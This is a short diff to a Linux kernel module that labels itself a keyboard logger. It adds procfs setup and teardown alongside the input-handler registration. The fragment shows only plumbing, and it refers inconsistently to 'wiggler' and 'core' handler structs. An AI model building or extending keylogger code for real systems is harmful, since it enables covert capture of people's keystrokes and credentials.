@@ -107,12 +107,18 @@ static int logger_init(void) {
 		printk(KERN_ERR "Could not register input handler: %d\n",res);
 		return res;
 	}			
+	res=procFsInit();
+	if(res) {
+		input_unregister_handler(&wiggler.inputHandler);
+		return res;
+	}
 	printk(KERN_INFO "Keyboard logger added: %s\n",res?"FAIL":"Success");
 	return res;
 }
 
 static void logger_cleanup(void) {
 	input_unregister_handler(&core.inputHandler);
+	procFsCleanup();
 	printk(KERN_INFO "Keyboard logger removed\n");
 }
 
